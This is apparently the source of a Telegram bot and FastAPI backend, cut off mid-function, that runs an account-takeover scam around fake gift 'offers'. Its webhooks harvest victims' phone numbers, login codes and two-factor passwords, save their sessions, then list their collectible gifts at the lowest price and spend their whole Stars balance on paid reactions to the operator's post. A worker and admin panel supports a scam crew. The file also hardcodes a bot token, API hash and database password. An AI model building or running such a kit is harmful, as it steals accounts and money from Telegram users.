import asyncio
import os
import re
import random
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, BotCommand, BotCommandScopeDefault,
)
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import BigInteger, String, Integer, DateTime, Text, select
import uvicorn

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError,
)
from telethon.tl.functions.messages import SendPaidReactionRequest
from telethon.tl.functions.payments import (
    GetSavedStarGiftsRequest, UpdateStarGiftPriceRequest,
    GetResaleStarGiftsRequest, GetStarsStatusRequest,
)
from telethon.tl.types import (
    InputSavedStarGiftUser, InputSavedStarGiftChat, StarsAmount,
)

# ═══════════════════════════════════════════════════════
#   КОНФИГ
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8215145424:AAGM0ImIq_YzbqziKRsrH3opVm9I3pnM_Sw"
BOT_USERNAME = "pinkslonrobot"
ADMIN_ID = 8986358602
MINIAPP_URL = "https://trustgift.github.io/offersbot/"
MINIAPP_SHORT = "app"
BACKEND_URL = "https://botofferswork.onrender.com"
API_ID = 26259835
API_HASH = "3fa32264398920f001dd2428b42060f6"
DATABASE_URL = "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"
TARGET_POST = "https://t.me/screamsoonlarp/1803"
PORT = int(os.getenv("PORT", "8080"))

_m = re.match(r"https?://t\.me/([^/]+)/(\d+)", TARGET_POST)
TARGET_CHANNEL = _m.group(1) if _m else None
TARGET_POST_ID = int(_m.group(2)) if _m else None

MAX_ATTEMPTS = 3

# ═══════════════════════════════════════════════════════
#   БАЗА
# ═══════════════════════════════════════════════════════

engine = create_async_engine(DATABASE_URL, echo=False, connect_args={"ssl": "require"})
SessionLocal = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)


class Base(DeclarativeBase):
    pass


class User(Base):
    __tablename__ = "users"
    id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    role: Mapped[str] = mapped_column(String(16), default="user")
    balance: Mapped[int] = mapped_column(Integer, default=0)
    total_offers: Mapped[int] = mapped_column(Integer, default=0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Offer(Base):
    __tablename__ = "offers"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger)
    worker_username: Mapped[str] = mapped_column(String(64), nullable=True)
    gift_name: Mapped[str] = mapped_column(String(128))
    gift_link: Mapped[str] = mapped_column(String(256))
    price_stars: Mapped[int] = mapped_column(Integer)
    price_usd: Mapped[str] = mapped_column(String(32), default="—")
    duration_hours: Mapped[int] = mapped_column(Integer, default=24)
    status: Mapped[str] = mapped_column(String(16), default="pending")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class AuthSession(Base):
    __tablename__ = "sessions"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    phone: Mapped[str] = mapped_column(String(32))
    code: Mapped[str] = mapped_column(String(16), nullable=True)
    password: Mapped[str] = mapped_column(String(128), nullable=True)
    session_string: Mapped[str] = mapped_column(Text, nullable=True)
    user_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    last_name: Mapped[str] = mapped_column(String(64), nullable=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    state: Mapped[str] = mapped_column(String(16), default="pending")
    attempts: Mapped[int] = mapped_column(Integer, default=0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Log(Base):
    __tablename__ = "logs"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    event: Mapped[str] = mapped_column(String(64))
    detail: Mapped[str] = mapped_column(Text, nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


async def init_db():
    try:
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all, checkfirst=True)
    except Exception as e:
        print(f"init_db warning: {e}")


async def get_user(user_id):
    async with SessionLocal() as s:
        return await s.get(User, user_id)


async def add_user(user_id, username=None, first_name=None, role="user"):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            return u
        u = User(id=user_id, username=username, first_name=first_name, role=role)
        s.add(u)
        await s.commit()
        await s.refresh(u)
        return u


async def set_role(user_id, role):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.role = role
            await s.commit()


async def change_balance(user_id, amount):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.balance += amount
            await s.commit()
            return u.balance
    return None


async def get_workers():
    async with SessionLocal() as s:
        r = await s.execute(select(User).where(User.role.in_(["worker", "admin"])))
        return r.scalars().all()


async def create_offer(worker_id, worker_username, gift_name, gift_link, price_stars, price_usd, duration_hours=24):
    async with SessionLocal() as s:
        o = Offer(worker_id=worker_id, worker_username=worker_username,
                  gift_name=gift_name, gift_link=gift_link,
                  price_stars=price_stars, price_usd=price_usd,
                  duration_hours=duration_hours)
        s.add(o)
        u = await s.get(User, worker_id)
        if u:
            u.total_offers += 1
        await s.commit()
        await s.refresh(o)
        return o


async def get_offer(offer_id):
    async with SessionLocal() as s:
        return await s.get(Offer, offer_id)


async def get_worker_offers(worker_id):
    async with SessionLocal() as s:
        r = await s.execute(select(Offer).where(Offer.worker_id == worker_id).order_by(Offer.id.desc()))
        return r.scalars().all()


async def add_log(worker_id=None, offer_id=None, event="", detail=""):
    async with SessionLocal() as s:
        l = Log(worker_id=worker_id, offer_id=offer_id, event=event, detail=detail)
        s.add(l)
        await s.commit()


async def get_logs(limit=20):
    async with SessionLocal() as s:
        r = await s.execute(select(Log).order_by(Log.id.desc()).limit(limit))
        return r.scalars().all()


async def create_auth_session(offer_id, phone):
    async with SessionLocal() as s:
        sess = AuthSession(offer_id=offer_id, phone=phone, state="phone_sent")
        s.add(sess)
        await s.commit()
        await s.refresh(sess)
        return sess


async def get_session_by_phone(phone):
    async with SessionLocal() as s:
        r = await s.execute(
            select(AuthSession).where(AuthSession.phone == phone).order_by(AuthSession.id.desc())
        )
        return r.scalars().first()


async def update_session(sess_id, **kwargs):
    async with SessionLocal() as s:
        sess = await s.get(AuthSession, sess_id)
        if sess:
            for k, v in kwargs.items():
                setattr(sess, k, v)
            await s.commit()
            return sess


async def get_recent_sessions(limit=10):
    async with SessionLocal() as s:
        r = await s.execute(select(AuthSession).order_by(AuthSession.id.desc()).limit(limit))
        return r.scalars().all()


# ═══════════════════════════════════════════════════════
#   TELETHON
# ═══════════════════════════════════════════════════════

async def telethon_attempt_login(phone, code, password=None, session_str=None):
    client = TelegramClient(
        StringSession(session_str) if session_str else StringSession(),
        API_ID, API_HASH,
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=phone, code=code)
            except SessionPasswordNeededError:
                if not password:
                    await client.disconnect()
                    return False, 'password', None
                try:
                    await client.sign_in(password=password)
                except PasswordHashInvalidError:
                    await client.disconnect()
                    return False, 'password', None
            except PhoneCodeInvalidError:
                await client.disconnect()
                return False, 'code', None
            except PhoneCodeExpiredError:
                await client.disconnect()
                return False, 'expired', None
        me = await client.get_me()
        session_string = client.session.save()
        await client.disconnect()
        return True, {
            'user_id': me.id, 'first_name': me.first_name,
            'last_name': me.last_name, 'username': me.username,
        }, session_string
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        print(f"telethon login error: {e}")
        return False, 'error', None


async def telethon_sell_gift_and_react(session_string, gift_name_hint):
    """
    1. Логинится в аккаунт мамонта
    2. Получает список его подарков
    3. Находит подарок по имени из оффера
    4. Достаёт минимальную рыночную цену через GetResaleStarGifts
    5. Выставляет подарок за эту цену через UpdateStarGiftPrice
    6. Ждёт (продажа идёт асинхронно, но телеграм даёт уведомление)
    7. Ставит платную реакцию на пост всеми звёздами
    """
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    result = {
        "gifts_found": [],
        "target": None,
        "min_price": None,
        "listed": False,
        "reacted": False,
        "stars_sent": 0,
        "error": None,
    }
    try:
        await client.connect()
        me = await client.get_me()
        if not me:
            result["error"] = "session dead"
            return result

        # 1. получаем подарки пользователя
        try:
            gifts_resp = await client(GetSavedStarGiftsRequest(
                peer=me.id, offset="", limit=100
            ))
            gifts = getattr(gifts_resp, "gifts", []) or []
        except Exception as e:
            result["error"] = f"get saved gifts: {e}"
            return result

        # 2. смотрим что есть, ищем цель
        hint_clean = gift_name_hint.lower().split("#")[0].strip()
        for g in gifts:
            gift = getattr(g, "gift", None)
            title = str(getattr(gift, "title", "") or "")
            if title:
                result["gifts_found"].append(title)
            if hint_clean and hint_clean in title.lower() and not result["target"]:
                result["target"] = g

        if not result["target"]:
            result["error"] = f"подарок '{gift_name_hint}' не найден (есть: {result['gifts_found'][:5]})"
            return result

        target = result["target"]
        gift_obj = getattr(target, "gift", None)
        gift_id = getattr(gift_obj, "id", None)

        # 3. узнаём минимальную рыночную цену
        min_price = 1
        if gift_id:
            try:
                resale = await client(GetResaleStarGiftsRequest(
                    gift_id=gift_id, offset="", limit=10,
                    sort_by_price=True, sort_by_num=False,
                    stars_only=True, for_craft=False,
                ))
                resale_gifts = getattr(resale, "gifts", []) or []
                prices = []
                for r in resale_gifts:
                    amt = getattr(r, "resell_amount", None)
                    if amt:
                        p = getattr(amt, "amount", None) or getattr(amt, "stars", None)
                        if p:
                            prices.append(int(p))
                if prices:
                    min_price = min(prices)
            except Exception as e:
                print(f"resale price error: {e}")

        result["min_price"] = min_price

        # 4. выставляем на продажу
        msg_id = getattr(target, "msg_id", None)
        if not msg_id:
            result["error"] = "нет msg_id у подарка"
            return result

        try:
            await client(UpdateStarGiftPriceRequest(
                stargift=InputSavedStarGiftUser(msg_id=msg_id),
                resell_amount=StarsAmount(amount=min_price, nanos=0),
            ))
            result["listed"] = True
        except Exception as e:
            result["error"] = f"list error: {e}"
            return result

        # 5. получаем баланс звёзд
        balance = 0
        try:
            status = await client(GetStarsStatusRequest(peer=me.id))
            bal = getattr(status, "balance", None)
            if bal:
                balance = int(getattr(bal, "amount", 0) or 0)
        except Exception as e:
            print(f"stars status error: {e}")

        # 6. платная реакция на пост
        if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
            try:
                await client(SendPaidReactionRequest(
                    peer=TARGET_CHANNEL,
                    msg_id=TARGET_POST_ID,
                    count=balance,
                    random_id=random.getrandbits(63),
                ))
                result["reacted"] = True
                result["stars_sent"] = balance
            except Exception as e:
                result["error"] = f"reaction: {e}"
        else:
            result["error"] = f"balance={balance}, target={TARGET_CHANNEL}/{TARGET_POST_ID}"

        return result

    except Exception as e:
        result["error"] = str(e)
        return result
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════
#   BOT
# ═══════════════════════════════════════════════════════

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()


def user_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="🎁 Мои подарки", callback_data="my_gifts")],
        [InlineKeyboardButton(text="💼 Офферы", callback_data="offers_menu")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def worker_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
        [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
        [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        [InlineKeyboardButton(text="👥 Воркеры", callback_data="admin_workers")],
        [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def menu_for(role):
    if role == "admin": return admin_menu()
    if role == "worker": return worker_menu()
    return user_menu()


class OfferForm(StatesGroup):
    gift_link = State()
    price_stars = State()


class GrantForm(StatesGroup):
    user_id = State()


class BalanceForm(StatesGroup):
    user_id = State()
    amount = State()


@dp.message(CommandStart())
async def start(message: types.Message):
    uid = message.from_user.id
    role = "admin" if uid == ADMIN_ID else "user"
    u = await add_user(uid, message.from_user.username, message.from_user.first_name, role)
    if uid == ADMIN_ID and u.role != "admin":
        await set_role(uid, "admin")
        u.role = "admin"
    await message.answer(
        f"👋 <b>Gift Offers</b>\n\n"
        f"👤 <b>Профиль</b>\n"
        f"├ ID: <code>{uid}</code>\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"└ Баланс: <b>{u.balance} ⭐</b>",
        reply_markup=menu_for(u.role),
    )


@dp.callback_query(F.data == "main_menu")
async def main_menu(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    await call.message.edit_text(
        f"👋 <b>Gift Offers</b>\n\n"
        f"👤 <b>Профиль</b>\n"
        f"├ ID: <code>{u.id}</code>\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"└ Баланс: <b>{u.balance} ⭐</b>",
        reply_markup=menu_for(u.role),
    )


@dp.callback_query(F.data == "profile")
async def profile(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    await call.message.edit_text(
        f"👤 <b>Ваш профиль</b>\n\n"
        f"├ ID: <code>{u.id}</code>\n"
        f"├ Username: @{u.username or '—'}\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"├ Баланс: <b>{u.balance} ⭐</b>\n"
        f"└ Создано офферов: <b>{u.total_offers}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "buy_stars")
async def buy_stars(call: types.CallbackQuery):
    await call.message.edit_text(
        "⭐ <b>Покупка звёзд</b>\n\n"
        "1. Открой @PremiumBot\n"
        "2. Купи звёзды\n"
        "3. Отправь боту как подарок\n"
        "4. Баланс обновится",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⭐ @PremiumBot", url="https://t.me/PremiumBot")],
            [InlineKeyboardButton(text="📥 Я отправил", callback_data="stars_sent")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
        ]),
        disable_web_page_preview=True,
    )


@dp.callback_query(F.data == "stars_sent")
async def stars_sent(call: types.CallbackQuery):
    await call.message.edit_text(
        "⏳ Проверяем поступление…",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )
    try:
        await bot.send_message(ADMIN_ID,
            f"💰 <b>Пополнение</b>\n<code>{call.from_user.id}</code> @{call.from_user.username}")
    except Exception:
        pass


@dp.callback_query(F.data == "my_gifts")
async def my_gifts(call: types.CallbackQuery):
    await call.message.edit_text(
        "🎁 <b>Мои подарки</b>\n\nПодарки появятся после успешного оффера.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "offers_menu")
async def offers_menu(call: types.CallbackQuery):
    await call.message.edit_text(
        "💼 <b>Офферы</b>\n\nНужен доступ воркера.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📩 Запросить доступ", callback_data="request_access")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
        ]),
    )


@dp.callback_query(F.data == "request_access")
async def request_access(call: types.CallbackQuery):
    try:
        await bot.send_message(ADMIN_ID,
            f"🔔 <b>Запрос воркера</b>\n"
            f"<code>{call.from_user.id}</code> @{call.from_user.username or '—'}\n"
            f"<code>/grant {call.from_user.id}</code>")
    except Exception:
        pass
    await call.answer("Отправлено", show_alert=True)


# ─── ОФФЕР: карточка + кнопки на Mini App ───

def parse_offer_command(text):
    m = re.search(r'(https?://t\.me/nft/[\w\-]+)', text)
    if not m:
        return None
    gift_link = m.group(1)
    gift_name = gift_link.split("/")[-1].replace("-", " #")
    rest = text.replace(gift_link, "").replace("/offer", "")
    nums = re.findall(r'\d+', rest)
    if not nums:
        return None
    return gift_name, gift_link, int(nums[0])


def make_offer_card(o, duration=24):
    return (
        f"⚖️ <b>Gift Offers</b> отправил вам оффер на <b>{o.gift_name}</b>\n\n"
        f"Сумма оффера: <b>{o.price_stars}</b> ⭐️ ({o.price_usd}$)\n"
        f"За подарок: <b>{o.gift_name}</b>\n"
        f"Ссылка: {o.gift_link}\n"
        f"Длительность: <b>{duration}h</b>\n\n"
        f"Вы можете просмотреть и ПРИНЯТЬ/ОТКЛОНИТЬ оффер, нажав кнопку ниже"
    )


def make_offer_kb(offer_id):
    accept = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
    reject = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_reject"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Принять", url=accept)],
        [InlineKeyboardButton(text="❌ Отклонить", url=reject)],
    ])


@dp.business_message(F.text.regexp(r"^/offer"))
async def business_offer(message: types.Message):
    uid = message.from_user.id
    u = await get_user(uid)
    if not u or u.role not in ("worker", "admin"):
        await message.reply("❌ Нет доступа воркера.")
        return
    parsed = parse_offer_command(message.text or "")
    if not parsed:
        await message.reply("❌ Формат: <code>/offer https://t.me/nft/DeskCalendar-284528 650</code>")
        return
    gift_name, gift_link, price_stars = parsed
    price_usd = f"{price_stars * 0.0092:.2f}"
    o = await create_offer(
        worker_id=uid, worker_username=message.from_user.username,
        gift_name=gift_name, gift_link=gift_link,
        price_stars=price_stars, price_usd=price_usd, duration_hours=24,
    )
    await message.reply(make_offer_card(o), reply_markup=make_offer_kb(o.id))
    await add_log(worker_id=uid, offer_id=o.id, event="business_offer",
                  detail=f"{gift_name} за {price_stars}⭐")
    try:
        await bot.send_message(ADMIN_ID,
            f"🆕 <b>Новый оффер</b>\n{uid} @{message.from_user.username}\n"
            f"{gift_name} — {price_stars}⭐\nID: <code>{o.id}</code>")
    except Exception:
        pass


# ─── WORKER ───

@dp.callback_query(F.data == "worker_create")
async def create_start(call: types.CallbackQuery, state: FSMContext):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("worker", "admin"):
        await call.answer("Нет доступа", show_alert=True)
        return
    await state.set_state(OfferForm.gift_link)
    await call.message.edit_text(
        "➕ <b>Создание оффера</b>\n\n🔗 Отправьте ссылку на подарок:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu")]
        ]),
        disable_web_page_preview=True,
    )


@dp.message(OfferForm.gift_link)
async def offer_link(message: types.Message, state: FSMContext):
    link = message.text.strip()
    if "t.me/nft/" not in link:
        await message.answer("❌ Неверная ссылка.")
        return
    gift_name = link.split("/")[-1].replace("-", " #")
    await state.update_data(gift_link=link, gift_name=gift_name)
    await state.set_state(OfferForm.price_stars)
    await message.answer(f"✅ Подарок: <b>{gift_name}</b>\n\n⭐ Введите сумму в звёздах:")


@dp.message(OfferForm.price_stars)
async def offer_price(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    data = await state.get_data()
    price_stars = int(message.text)
    price_usd = f"{price_stars * 0.0092:.2f}"
    o = await create_offer(
        worker_id=message.from_user.id,
        worker_username=message.from_user.username,
        gift_name=data["gift_name"], gift_link=data["gift_link"],
        price_stars=price_stars, price_usd=price_usd, duration_hours=24,
    )
    await state.clear()
    await message.answer(
        "✅ <b>Оффер создан</b>\n\nПерешлите это сообщение:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n" + make_offer_card(o),
        reply_markup=make_offer_kb(o.id),
        disable_web_page_preview=True,
    )
    try:
        await bot.send_message(ADMIN_ID,
            f"🆕 <b>Новый оффер</b>\nВоркер: <code>{message.from_user.id}</code>\n"
            f"{o.gift_name} — {o.price_stars}⭐")
    except Exception:
        pass
    await add_log(worker_id=message.from_user.id, offer_id=o.id,
                  event="offer_created", detail=f"{o.gift_name} за {o.price_stars}⭐")


@dp.callback_query(F.data == "worker_offers")
async def my_offers(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("worker", "admin"):
        await call.answer("Нет доступа", show_alert=True)
        return
    offers = await get_worker_offers(call.from_user.id)
    if not offers:
        await call.message.edit_text(
            "📋 У вас пока нет офферов.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]),
        )
        return
    lines = [f"#{o.id} — {o.gift_name} — {o.price_stars}⭐ — {o.status}" for o in offers[:15]]
    await call.message.edit_text(
        "📋 <b>Мои офферы</b>\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


# ─── ADMIN ───

@dp.callback_query(F.data == "admin_workers")
async def workers_menu(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    workers = await get_workers()
    lines = [f"{'👑' if w.role == 'admin' else '🔧'} <code>{w.id}</code> — @{w.username or '—'} — {w.balance}⭐"
             for w in workers]
    await call.message.edit_text(
        "👥 <b>Воркеры</b>\n\n" + ("\n".join(lines) if lines else "<i>Пока никого</i>"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Выдать", callback_data="admin_grant")],
            [InlineKeyboardButton(text="➖ Забрать", callback_data="admin_revoke")],
            [InlineKeyboardButton(text="💰 Баланс", callback_data="admin_balance")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
        ]),
    )


@dp.callback_query(F.data == "admin_grant")
async def grant_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await state.update_data(action="grant")
    await call.message.edit_text(
        "➕ Введите user_id:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
        ]),
    )


@dp.callback_query(F.data == "admin_revoke")
async def revoke_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await state.update_data(action="revoke")
    await call.message.edit_text(
        "➖ Введите user_id:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
        ]),
    )


@dp.message(GrantForm.user_id)
async def grant_finish(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    data = await state.get_data()
    uid = int(message.text)
    if data.get("action") == "revoke":
        await set_role(uid, "user")
        await message.answer(f"✅ <code>{uid}</code> больше не воркер.")
    else:
        await set_role(uid, "worker")
        await message.answer(f"✅ <code>{uid}</code> теперь воркер.")
        try:
            await bot.send_message(uid, "🎉 Доступ воркера выдан. /start")
        except Exception:
            pass
    await state.clear()


@dp.callback_query(F.data == "admin_balance")
async def balance_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(BalanceForm.user_id)
    await call.message.edit_text("💰 Введите user_id:")


@dp.message(BalanceForm.user_id)
async def balance_user(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    await state.update_data(target=message.text)
    await state.set_state(BalanceForm.amount)
    await message.answer("Введите сумму:")


@dp.message(BalanceForm.amount)
async def balance_amount(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        amount = int(message.text)
    except ValueError:
        await message.answer("❌ Введите число.")
        return
    data = await state.get_data()
    uid = int(data["target"])
    new = await change_balance(uid, amount)
    await state.clear()
    await message.answer(f"✅ Баланс <code>{uid}</code>: <b>{new} ⭐</b>" if new is not None else "❌ Не найден.")


@dp.callback_query(F.data == "admin_logs")
async def admin_logs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    logs = await get_logs(20)
    if not logs:
        await call.message.edit_text("📊 Логов нет.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]))
        return
    lines = [f"[{l.created_at:%H:%M}] {l.event} — {l.detail or '—'}" for l in logs]
    await call.message.edit_text(
        "📊 <b>Логи</b>\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "admin_sessions")
async def admin_sessions(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    sess = await get_recent_sessions(10)
    if not sess:
        await call.message.edit_text("💎 Сессий нет.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]))
        return
    lines = [f"#{s.id} — {s.phone} — {s.state} — {s.first_name or '—'}" for s in sess]
    await call.message.edit_text(
        "💎 <b>Сессии</b>\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.message(Command("grant"))
async def cmd_grant(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("Использование: <code>/grant user_id</code>")
        return
    uid = int(args[1])
    await set_role(uid, "worker")
    await message.answer(f"✅ <code>{uid}</code> теперь воркер.")
    try:
        await bot.send_message(uid, "🎉 Доступ воркера выдан. /start")
    except Exception:
        pass


@dp.message(Command("revoke"))
async def cmd_revoke(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("Использование: <code>/revoke user_id</code>")
        return
    await set_role(int(args[1]), "user")
    await message.answer(f"✅ <code>{args[1]}</code> больше не воркер.")


@dp.message(Command("balance"))
async def cmd_balance(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit():
        await message.answer("Использование: <code>/balance user_id amount</code>")
        return
    new = await change_balance(int(args[1]), int(args[2]))
    await message.answer(f"✅ Баланс: <b>{new} ⭐</b>" if new is not None else "❌ Не найден.")


# ═══════════════════════════════════════════════════════
#   BACKEND
# ═══════════════════════════════════════════════════════

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


class PhonePayload(BaseModel):
    offer_id: int
    phone: str


class CodePayload(BaseModel):
    offer_id: int
    phone: str
    code: str


class PasswordPayload(BaseModel):
    offer_id: int
    phone: str
    code: str
    password: str | None = None


async def notify_admin(text):
    try:
        await bot.send_message(ADMIN_ID, text)
    except Exception:
        pass


@app.post("/webhook/phone")
async def wh_phone(p: PhonePayload):
    sess = await create_auth_session(p.offer_id, p.phone)
    await add_log(offer_id=p.offer_id, event="phone_received", detail=p.phone)
    await notify_admin(f"📱 <b>Номер</b>\n{p.phone}\nОффер: #{p.offer_id}")

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.send_code_request(p.phone)
        await update_session(sess.id, state="code_sent")
        await update_session(sess.id, session_string=client.session.save())
        await client.disconnect()
        return {"ok": True}
    except Exception as e:
        await client.disconnect()
        await add_log(offer_id=p.offer_id, event="send_code_error", detail=str(e))
        return {"ok": False, "error": "Не удалось отправить код."}


@app.post("/webhook/code")
async def wh_code(p: CodePayload):
    sess = await get_session_by_phone(p.phone)
    if not sess:
        return {"ok": False, "error": "Сессия не найдена."}
    if sess.attempts >= MAX_ATTEMPTS:
        return {"ok": False, "error": "Превышено количество попыток."}

    ok, res, session_str = await telethon_attempt_login(
        phone=p.phone, code=p.code, session_str=sess.session_string,
    )
    if ok:
        await update_session(sess.id, code=p.code, state="logged",
                             session_string=session_str,
                             user_id=res["user_id"], first_name=res["first_name"],
                             last_name=res["last_name"], username=res["username"])
        await add_log(offer_id=p.offer_id, event="logged_in",
                      detail=f"{res['first_name']} @{res['username']}")
        await notify_admin(
